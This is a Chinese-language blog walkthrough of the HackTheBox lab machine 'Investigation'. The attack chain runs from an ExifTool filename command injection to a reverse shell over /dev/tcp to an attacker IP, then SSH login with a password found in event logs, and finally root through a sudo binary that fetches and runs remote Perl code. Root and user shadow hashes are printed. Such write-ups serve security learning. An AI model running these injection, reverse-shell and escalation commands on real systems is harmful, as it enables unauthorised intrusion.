---
title: Investigation - HackTheBox
url: https://darkwing.moe/2023/01/23/Investigation-HackTheBox/
source: 喵喵喵喵
date: 2023-01-24
fetch_date: 2025-10-04T04:36:47.855274
---

# Investigation - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Investigation - HackTheBox

# Investigation - HackTheBox

##### 2023-01-23

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.197](#10-10-11-197)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. ExifTool](#ExifTool)
   1. [3.1. 命令注入](#命令注入)
   2. [3.2. reverse shell](#reverse-shell)
4. [4. investigation](#investigation)
   1. [4.1. 日志分析](#日志分析)
5. [5. user flag](#user-flag)
6. [6. 提权信息](#提权信息)
7. [7. binary](#binary)
8. [8. 提权 & root flag](#提权-amp-root-flag)
   1. [8.1. shadow](#shadow)
9. [9. 参考资料](#参考资料)

# Investigation - HackTheBox

2023-01-23

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/525>
* ## 10.10.11.197

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012301.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.197 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 12:58 CST Nmap scan report for 10.10.11.197 Host is up (0.10s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 2f1e6306aa6ebbcc0d19d4152674c6d9 (RSA) |   256 274520add2faa73a8373d97c79abf30b (ECDSA) |_  256 4245eb916e21020617b2748bc5834fe0 (ED25519) 80/tcp open  http    Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://eforenzics.htb/ Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 36.10 seconds ``` |

## 80

需要加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.197 eforenzics.htb ``` |

在线数字取证：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012302.jpg)

# ExifTool

正常一张图片测试，发现是12.37的Exiftool，搜索发现相关漏洞：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012302.jpg)

* Command Injection in Exiftool before 12.38
  <https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429>

## 命令注入

文件名注入，可以直接复制重命名方便操作：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` cp miao.jpg "curl 10.10.14.9 |" ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012304.jpg)

## reverse shell

有字符限制，可以通过管道得到shell：

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` echo "sh -i >& /dev/tcp/10.10.14.9/4444 0>&1" > index.html python -m http.server 80  cp miao.jpg "curl 10.10.14.9 | bash |" ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012305.jpg)

# investigation

/usr/local/investigation目录中发现一个邮件，其中有个附件里面是windows日志文件：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012306.jpg)

可以使用在线网站提取附件：

* Free MSG EML Viewer | Free Online Email Viewer
  <https://www.encryptomatic.com/viewer/>

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012307.jpg)

## 日志分析

evtx文件，可以直接使用windows分析，也可以用第三方工具,日志文件中得到密码,就是很常见的误操作场景，把密码当用户名输入了，被记录在日志中：

* omerbenamram/evtx: A Fast (and safe) parser for the Windows XML Event Log (EVTX) format
  <https://github.com/omerbenamram/evtx>

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` ./evtx_dump-v0.8.0-x86_64-apple-darwin security.evtx -o json > events.json  cat events.json| grep TargetUserName | grep "\!"       "TargetUserName": "Def@ultf0r3nz!csPa$$",       "TargetUserName": "Def@ultf0r3nz!csPa$$", ``` |

# user flag

用户名可以通过在www shell中知道是smorton,使用上面得到的密码登录：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` ssh smorton@10.10.11.197 Def@ultf0r3nz!csPa$$ ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012308.jpg)

# 提权信息

sudo可以发现一个binary文件，尝试运行直接退出：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012309.jpg)

下载下来进行分析:

|  |  |
| --- | --- |
| ``` 1 ``` | ``` scp smorton@10.10.11.197:/usr/bin/binary . ``` |

# binary

反编译查看代码逻辑，发现程序运行argc需要是3，所以需要两个参数，第二个参数可以看作密码，校验通过后，使用curl请求第一个参数的内容，写入到第二个参数作为文件名的文件中，然后以root权限使用perl运行这个文件：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012310.jpg)

# 提权 & root flag

任意perl代码：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` # root.pl system("chmod u+s /bin/bash");  # target sudo /usr/bin/binary http://10.10.14.9:7777/root.pl lDnxUysaQn ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023012311.jpg)

## shadow

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` root:$6$8KeEz2EYMU05RVyS$W5GGqM4AHw3D1tLul.LJN2BPUhqEdflA.yCQyu7/c2PtZmbAn6qevqSaUlFyhPQbgbhFmDB00I3Of7qPep2WP/:19233:0:99999:7::: smorton:$6$b6pcA0sG5CxXFPzY$QW9XnZAa0B9xm0y8PkNRG497k6lae4q.7zozLTXHu3YE5ElW5Q6ithOG5kbuQOMS8leu1WceWJEJ3J6ImcKVS0:19234:0:99999:7::: ``` |

# 参考资料

* Command Injection in Exiftool before 12.38
  <https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429>
* Free MSG EML Viewer | Free Online Email Viewer
  <https://www.encryptomatic.com/viewer/>
* omerbenamram/evtx: A Fast (and safe) parser for the Windows XML Event Log (EVTX) format
  <https://github.com/omerbenamram/evtx>
* Investigation - HTB [Discussion] | BreachForums
  <https://breached.vc/Thread-Investigation-HTB-Discussion>

> Last updated: 2023-04-23 08:51:30
>
> 水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
>
> [![暗羽](/img/avatar.jpg)
> 暗羽](https://darkwing.moe)

* [HackTheBox](/tags/HackTheBox/)

[Prev

#### Encoding - HackTheBox](/2023/02/02/Encoding-HackTheBox/)

[Next

#### Stocker - HackTheBox](/2023/01/15/Stocker-HackTheBox/)

站点总访客数：

站点总访问量：

This blog is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

暗羽 © 2014 - 2025

Power by [Hexo](http://hexo.io/) Theme [indigo](https://github.com/yscoder/hexo-theme-indigo)

扫一扫，分享到微信

![微信分享二维码](data:image/png;base64...)

- [{title}

  {tags}

  {date}](%7Bpath%7D)